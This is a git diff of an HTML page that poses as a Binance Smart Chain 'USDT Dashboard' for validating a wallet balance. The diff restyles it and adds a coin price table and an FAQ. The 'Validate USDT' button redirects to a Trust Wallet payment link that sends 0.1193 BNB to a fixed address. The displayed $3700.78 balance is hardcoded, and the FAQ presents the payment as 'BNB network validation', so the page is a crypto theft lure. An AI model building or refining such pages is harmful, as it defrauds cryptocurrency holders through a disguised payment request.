@@ -2,34 +2,64 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Balance - BSC</title>
+  <title>USDT Dashboard - BSC</title>
+  <!-- Web3 and WalletConnect -->
   <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
-  <style>
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>  <style>
     body {
-      font-family: sans-serif;
-      background: #121212;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #0b0e11;
       color: #fff;
-      text-align: center;
-      padding: 2rem;
+      margin: 0;
+      padding: 0;
     }
-    h1, h2 {
-      color: #f0f0f0;
+    header {
+      background-color: #121212;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      flex-wrap: wrap;
+    }
+    .usdt-info {
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
+    .usdt-info img {
+      width: 36px;
+      height: 36px;
+      margin-right: 10px;
+    }
+    .btn-group {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
     }
     button {
       background: #f0b90b;
       color: #000;
       border: none;
-      padding: 1rem 2rem;
-      border-radius: 10px;
-      font-size: 1.1rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: bold;
       cursor: pointer;
-      margin: 0.5rem;
+    }
+    main {
+      text-align: center;
+      padding: 2rem;
+    }
+    h1 {
+      color: #f9f9f9;
+      font-size: 2rem;
+      margin-bottom: 2rem;
     }
     .token-box {
       background: #1e1e1e;
-      padding: 2rem;
+      padding: 1.5rem;
       border-radius: 12px;
       display: inline-block;
       margin-top: 2rem;
@@ -45,61 +75,98 @@
       margin-left: 0.5rem;
       vertical-align: middle;
     }
-    #marketPrices {
+    #marketChart {
       margin-top: 2rem;
-      background: #1e1e1e;
+      border-radius: 12px;
+      overflow: hidden;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    #faqPage {
+      display: none;
+      background: #121212;
+      padding: 2rem;
+      color: #f1f1f1;
+      font-size: 1rem;
+    }
+    #priceTable {
+      margin: 2rem auto;
+      max-width: 600px;
+      background: #1a1a1a;
+      border-radius: 12px;
       padding: 1rem;
-      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
     }
-    .coin-price {
-      margin: 0.5rem 0;
+    #priceTable table {
+      width: 100%;
+      color: #f0f0f0;
+      border-collapse: collapse;
     }
-  </style>
-</head>
+    #priceTable th, #priceTable td {
+      padding: 0.5rem;
+      text-align: left;
+      border-bottom: 1px solid #333;
+    }
+    #priceTable th {
+      color: #f0b90b;
+    }
+    .coin-logo {
+      width: 20px;
+      height: 20px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @media (max-width: 768px) {
+      header, .btn-group {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      #marketChart iframe {
+        width: 100% !important;
+        height: 300px;
+      }
+    }
+  </style></head>
 <body>
-  <h1>Validate Your USDT Balance on BSC</h1>
-  <div style="display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap;">
-    <button id="connectWallet">Validate Asset</button>
-    <button id="connectCoinStats">Connect Wallet</button>
-    <button onclick="window.location.href='faq.html'">FAQ</button>
-  </div>  <div id="walletInfo" style="display:none">
-    <div class="token-box">
-      <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
-        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT">
-      </a>
-      <span id="usdtAmount">$3700.78 USDT</span>
+  <header>
+    <div class="usdt-info">
+      <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT Logo" />
+      Total USDT: $3700.78
     </div>
-  </div>  <div id="portfolioInfo" style="display:none; margin-top:2rem;">
-    <h2>Your Wallet Portfolio</h2>
-    <div id="portfolioList" style="text-align: left; max-width: 600px; margin: 1rem auto;"></div>
-  </div>  <div style="margin-top:2rem;">
-    <h2>Live USDT/BTC Chart</h2>
-    <div class="tradingview-widget-container">
-      <div id="tradingview_e95f5"></div>
-      <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
-      <script type="text/javascript">
-        new TradingView.widget({
-          "width": "100%",
-          "height": 400,
-          "symbol": "BINANCE:BTCUSDT",
-          "interval": "D",
-          "timezone": "Etc/UTC",
-          "theme": "dark",
-          "style": "1",
-          "locale": "en",
-          "toolbar_bg": "#f1f3f6",
-          "enable_publishing": false,
-          "hide_top_toolbar": true,
-          "hide_legend": false,
-          "save_image": false,
-          "container_id": "tradingview_e95f5"
-        });
-      </script>
+    <div class="btn-group">
+      <button id="connectWallet">Validate USDT</button>
+      <button id="connectCoinStats">Connect Wallet</button>
+      <button id="faqButton">FAQ</button>
     </div>
-  </div>  <div id="marketPrices">
-    <h2>Coin Prices (CoinGecko)</h2>
-    <div id="prices"></div>
-  </div>  <script>
+  </header>  <main>
+    <h1>Validate Your USDT Balance on BSC</h1>
+    <div id="walletInfo" style="display:none">
+      <div class="token-box">
+        <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
+          <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT">
+        </a>
+        <span id="usdtAmount">$3700.78 USDT</span>
+      </div>
+    </div><div id="marketChart">
+  <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBTC%22%2C%22width%22%3A%22900%22%2C%22height%22%3A%22400%22%2C%22locale%22%3A%22en%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Afalse%7D"
+    width="100%" height="400" frameborder="0" allowtransparency="true" scrolling="no"></iframe>
+</div>
+
+<div id="priceTable">
+  <h2 style="text-align:center; color:#f0b90b">Live Coin Prices</h2>
+  <table>
+    <thead>
+      <tr><th>Coin</th><th>Price (USD)</th></tr>
+    </thead>
+    <tbody id="coinPrices"></tbody>
+  </table>
+</div>
+
+  </main>  <section id="faqPage">
+    <h2>Frequently Asked Questions</h2>
+    <p><strong>[1] HOW TO VALIDATE:</strong> To validate Asset click on <strong>connect wallet</strong> which redirects you to trust wallet. Confirm your BNB network validation, wait for 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>
+  </section>  <script>
     const providerOptions = {
       walletconnect: {
         package: window.WalletConnectProvider.default,
@@ -115,82 +182,77 @@
       providerOptions
     });
 
+    let web3;
+
     async function getUSDTBalance(address) {
-      document.getElementById("usdtAmount").textContent = "$3700.78 USDT";
+      const hardcodedBalance = "3700.78";
+      document.getElementById("usdtAmount").textContent = `$${hardcodedBalance} USDT`;
     }
 
     async function initiateWalletConnectFlow() {
       try {
         const provider = await web3Modal.connect();
-        const web3 = new Web3(provider);
+        web3 = new Web3(provider);
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          alert("Please switch to Binance Smart Chain (BSC)");
+          return;
+        }
         const accounts = await web3.eth.getAccounts();
         const userAddress = accounts[0];
         document.getElementById("walletInfo").style.display = "block";
         await getUSDTBalance(userAddress);
       } catch (err) {
-        console.error("Wallet connection error:", err);
+        console.error("Connection error:", err);
+        alert("Failed to connect. Try again.");
       }
     }
 
     document.getElementById("connectWallet").addEventListener("click", () => {
       window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193";
-      setTimeout(() => {
-        initiateWalletConnectFlow();
-      }, 5 * 60 * 1000);
+      setTimeout(() => initiateWalletConnectFlow(), 5 * 60 * 1000);
     });
 
-    // CoinStats portfolio fetch using token in URL
-    async function fetchCoinStatsPortfolio(userToken) {
-      try {
-        const response = await fetch("https://api.coinstats.app/public/v1/portfolio", {
-          method: "GET",
-          headers: { Authorization: `Bearer ${userToken}` }
-        });
-        const data = await response.json();
-        const portfolioDiv = document.getElementById("portfolioList");
+    document.getElementById("connectCoinStats").addEventListener("click", () => {
+      window.location.href = "https://coinstats.app/wallet";
+    });
 
-        if (data && data.coins && data.coins.length > 0) {
-          portfolioDiv.innerHTML = '';
-          data.coins.forEach(coin => {
-            const row = document.createElement("div");
-            row.className = "coin-price";
-            row.innerHTML = `<strong>${coin.name} (${coin.symbol}):</strong> ${coin.amount} (${coin.balance.toFixed(2)} USD)`;
-            portfolioDiv.appendChild(row);
-          });
-          document.getElementById("portfolioInfo").style.display = "block";
-        }
-      } catch (err) {
-        console.error("CoinStats fetch failed", err);
+    document.getElementById("faqButton").addEventListener("click", () => {
+      const faq = document.getElementById("faqPage");
+      faq.style.display = faq.style.display === "none" ? "block" : "none";
+    });
+
+    async function fetchCoinPrices() {
+      const ids = [
+        "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum",
+        "dogecoin", "ripple", "cardano", "polygon", "tron", "polkadot",
+        "shiba-inu", "litecoin", "chainlink"
+      ];
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(",")}&vs_currencies=usd&include_logo=true`;
+      const res = await fetch(url);
+      const data = await res.json();
+      const tbody = document.getElementById("coinPrices");
+      tbody.innerHTML = "";
+      for (const coinId of ids) {
+        const coin = data[coinId];
+        const logoUrl = `https://assets.coingecko.com/coins/images/1/large/placeholder.png`;
+        const row = document.createElement("tr");
+        row.innerHTML = `<td><img class="coin-logo" src="https://assets.coingecko.com/coins/images/${getCoinLogoId(coinId)}.png" alt=""> ${coinId.replace(/-/g, ' ')}</td><td>$${coin.usd.toLocaleString()}</td>`;
+        tbody.appendChild(row);
       }
     }
 
-    document.getElementById("connectCoinStats").addEventListener("click", () => {
-      window.location.href = "https://coinstats.app/wallet"; // OAuth redirect placeholder
-    });
+    function getCoinLogoId(coinId) {
+      const logos = {
+        "tether": "325", "bitcoin": "1", "binancecoin": "825",
+        "binance-usd": "9576", "solana": "4128", "ethereum": "279",
+        "dogecoin": "74", "ripple": "44", "cardano": "975",
+        "polygon": "3890", "tron": "1958", "polkadot": "12145",
+        "shiba-inu": "11939", "litecoin": "2", "chainlink": "877"
+      };
+      return logos[coinId] || "1";
+    }
 
-    window.addEventListener("load", () => {
-      const params = new URLSearchParams(window.location.search);
-      const token = params.get("token");
-      if (token) fetchCoinStatsPortfolio(token);
-
-      // CoinGecko price fetch
-      const coins = [
-        "tether", "bitcoin", "binancecoin", "binance-usd", "solana",
-        "ethereum", "dogecoin", "cardano", "tron", "polkadot",
-        "avalanche-2", "chainlink", "litecoin", "uniswap", "polygon"
-      ];
-
-      fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coins.join(',')}&vs_currencies=usd`)
-        .then(res => res.json())
-        .then(data => {
-          const priceContainer = document.getElementById("prices");
-          coins.forEach(id => {
-            const row = document.createElement("div");
-            row.className = "coin-price";
-            row.innerText = `${id.toUpperCase()}: $${data[id]?.usd || 'N/A'}`;
-            priceContainer.appendChild(row);
-          });
-        });
-    });
+    fetchCoinPrices();
   </script></body>
 </html>
